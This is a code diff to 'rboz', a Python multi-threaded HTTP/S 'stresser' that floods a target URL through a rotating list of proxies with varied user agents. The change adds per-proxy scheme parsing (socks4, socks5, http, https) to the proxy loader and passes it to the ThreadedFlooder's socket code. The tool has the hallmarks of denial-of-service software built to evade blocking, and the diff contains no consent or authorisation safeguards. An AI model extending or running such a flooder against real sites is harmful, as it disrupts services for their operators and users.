@@ -1,6 +1,10 @@
-"""rboz – fast multi-threaded raw-socket HTTP/S stresser.
-
+"""
+rboz – fast multi-threaded raw-socket HTTP/S stresser.
 Requires Python 3.12+ and PySocks (pip install PySocks).
+
+Proxy file format (one per line):
+  scheme://host:port   (e.g. socks4://47.250.155.254:8004)
+  host:port            (global --proxy-type is used)
 """
 
 from __future__ import annotations
@@ -72,6 +76,7 @@ class Config:
 class ProxyTuple(NamedTuple):
     host: str
     port: int
+    proxy_type: str          # Override for this proxy (socks4, socks5, http, https)
     original_str: str
 
 
@@ -103,27 +108,47 @@ class ProxyManager:
             proxy_str = raw.strip()
             if not proxy_str or proxy_str.startswith("#"):
                 continue
-            if (p := self._parse(proxy_str)) is not None:
+            if (p := self._parse(proxy_str, self.proxy_type)) is not None:
                 self._proxies.append(p)
 
         if not self._proxies:
             logger.error("No valid proxies found in %s", path)
             sys.exit(1)
 
-        logger.info("Loaded %d %s proxies from %s", len(self._proxies), self.proxy_type, path)
+        logger.info("Loaded %d proxies from %s (global type: %s)", len(self._proxies), path, self.proxy_type)
         self._cycle = itertools.cycle(self._proxies)
 
     @staticmethod
-    def _parse(proxy_str: str) -> ProxyTuple | None:
+    def _parse(proxy_str: str, default_type: str) -> ProxyTuple | None:
+        """Parse a proxy string. Supports optional scheme:// prefix.
+        If scheme is present and recognised, that type is used; else default_type.
+        """
+        scheme = ""
+        if "://" in proxy_str:
+            scheme, rest = proxy_str.split("://", 1)
+            scheme = scheme.lower().strip()
+        else:
+            rest = proxy_str
+
         try:
-            host, port_str = proxy_str.split(":", 1)
+            host, port_str = rest.rsplit(":", 1)
             port = int(port_str)
             if not host or not (1 <= port <= 65535):
                 raise ValueError("invalid host or port")
-            return ProxyTuple(host=host, port=port, original_str=proxy_str)
         except ValueError as exc:
             logger.warning("Skipping invalid proxy '%s': %s", proxy_str, exc)
             return None
+
+        # Determine final proxy type: scheme from file wins, else global default
+        if scheme in ("socks4", "socks5", "http", "https"):
+            used_type = scheme
+        elif scheme:
+            logger.warning("Unknown proxy scheme '%s' in '%s' – falling back to '%s'", scheme, proxy_str, default_type)
+            used_type = default_type
+        else:
+            used_type = default_type
+
+        return ProxyTuple(host=host, port=port, proxy_type=used_type, original_str=proxy_str)
 
     # ------------------------------------------------------------------
     def next(self) -> ProxyTuple | None:
@@ -149,7 +174,6 @@ class ResourceManager:
     _lock = threading.Lock()
 
     def __new__(cls, user_agents_file: Path = DEFAULT_USER_AGENTS_FILE) -> ResourceManager:
-        # Simple double-checked singleton so every caller gets the same loaded data.
         if cls._instance is None:
             with cls._lock:
                 if cls._instance is None:
@@ -357,8 +381,11 @@ class ThreadedFlooder:
                 time.sleep(0.2)
                 continue
 
+            # Use the per-proxy type if available, otherwise fall back to global config
+            proxy_type = proxy.proxy_type if proxy else cfg.proxy_type
+
             sock = open_socket(
-                self.parsed, proxy, cfg.proxy_type, cfg.connect_timeout, cfg.rw_timeout
+                self.parsed, proxy, proxy_type, cfg.connect_timeout, cfg.rw_timeout
             )
             if sock is None:
                 with self._lock:
@@ -530,7 +557,7 @@ def build_config(args: argparse.Namespace) -> Config:
 
 def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        description="rboz – threaded raw-socket HTTP/S stresser",
+        description="rboz – threaded raw-socket HTTP/S stresser (supports per-proxy schemes)",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
     p.add_argument("url", help="Target URL (e.g. https://example.com/path)")
@@ -540,13 +567,13 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
         "--proxy-type",
         default="direct",
         choices=["direct", "http", "https", "socks4", "socks5"],
-        help="Proxy protocol",
+        help="Global proxy protocol (overridden by scheme in proxy file)",
     )
     p.add_argument(
         "--proxy-file",
         default=None,
         metavar="FILE",
-        help="File with proxies (host:port, one per line). Required when --proxy-type != direct.",
+        help="File with proxies (one per line: [scheme://]host:port)",
     )
     p.add_argument(
         "--user-agents",
